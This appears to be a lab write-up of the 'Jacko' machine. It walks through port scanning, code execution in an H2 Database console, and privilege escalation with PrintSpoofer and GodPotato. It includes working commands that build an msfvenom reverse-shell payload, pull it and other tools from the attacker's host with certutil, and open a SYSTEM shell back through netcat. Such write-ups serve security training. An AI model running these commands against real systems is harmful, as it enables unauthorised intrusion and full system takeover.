# Jacko

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.66
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 18:07 +08
Nmap scan report for 192.168.197.66
Host is up (0.17s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
5040/tcp  open     unknown
8082/tcp  open     blackice-alerts
9092/tcp  open     XmlIpcRegSvc
41213/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
57199/tcp filtered unknown
```

Lots of ports. I did a detailed `nmap` scan to further enumerate the ports. We would find a H2 Instance on one of the ports from this scan:

```
$ sudo nmap -p 80,135,139,445,5040,8082,9092 -sC -sV -O -T4 -Pn 192.168.197.66
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 18:25 +08
Nmap scan report for 192.168.197.66
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
```

The H2 Database does have a few code execution exploits that might work.&#x20;

### H2 Database --> RCE

Port 8082 shows us the login to the H2 database.

<figure><img src="../../../.gitbook/assets/image (2284).png" alt=""><figcaption></figcaption></figure>

We can just click 'Connect', and login successfully.

<figure><img src="../../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>

This version has code execution exploits available:

```
$ searchsploit H2 Database 1.4.199
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
H2 Database 1.4.199 - JNI Code Execution                   | java/local/49384.txt
----------------------------------------------------------- ---------------------------------
```

To exploit this, we would need to just copy and paste the script contents of the `searchsploit` file twice, and we would get RCE:

<figure><img src="../../../.gitbook/assets/image (831).png" alt=""><figcaption></figcaption></figure>

To get a reverse shell, simply use these 2 commands with a `msfvenom` generated payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.177 LPORT=21 -f exe > pwn.exe
certutil -urlcache -split -f http://192.168.45.177/pwn.exe C:\\Windows\\Tasks\\pwn.exe
C:\\Windows\\Tasks\\pwn.exe
```

<figure><img src="../../../.gitbook/assets/image (3697).png" alt=""><figcaption></figcaption></figure>

`whoami.exe` is located in `C:\Windows\System32`, and this machine has a broken PATH variable.

## Privilege Escalation

### PrintSpoofer Fail

We can check our privileges using `whoami.exe`:

```
C:\Windows\System32>whoami.exe /priv
whoami.exe /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

The `SeImpersonatePrivilege` is enabled, so we can use `PrintSpoofer.exe` to exploit this. First, let's download the binary to the machine:

```
C:\Windows\System32>certutil -urlcache -split -f http://192.168.45.177/PrintSpoofer.exe C:/Windows/Tasks/print.exe
certutil -urlcache -split -f http://192.168.45.177/PrintSpoofer.exe C:/Windows/Tasks/print.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

However, the exploit seems to fail:

```
C:\Users\tony\Desktop>.\print.exe -i -c cmd
.\print.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out
```

So we have to find another way.&#x20;

### GodPotato.exe

We can try using `GodPotato.exe` since that privilege is probably the intended solution:

```
C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c whoami"
.\godpotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140725151858688
[*] DispatchTable: 0x140725154201184
[*] UseProtseqFunction: 0x140725153568784
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\509f9274-ba8c-4b7c-844e-55d04cdf359c\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009002-05c4-ffff-2de7-6cc9f11fd1cf
[*] DCOM obj OXID: 0x20259e4ef373758d
[*] DCOM obj OID: 0xdee8046159a66ec5
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 800 Token:0x504  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 408
```

Looks like it works well. Now we can download `nc.exe` onto the machine and get ourselves another reverse shell.&#x20;

```
C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:/Windows/Tasks/nc.exe 192.168.45.177 4444 -e cmd.exe
.\godpotato.exe -cmd "cmd /c C:/Windows/Tasks/nc.exe 192.168.45.177 4444 -e cmd.exe"
[*] CombaseModule: 0x140725151858688
[*] DispatchTable: 0x140725154201184
[*] UseProtseqFunction: 0x140725153568784
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\36900a7f-bec3-4dd7-9606-fc8ece7a7d11\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008802-0d1c-ffff-64b7-d6de22e4ee03
[*] DCOM obj OXID: 0x1bb30dc7fc7c0cb7
[*] DCOM obj OID: 0x770fb99694a2c278
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 800 Token:0x504  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1592
```

<figure><img src="../../../.gitbook/assets/image (2456).png" alt=""><figcaption></figcaption></figure>

This is a SYSTEM shell, and we can grab the required flags. Rooted!
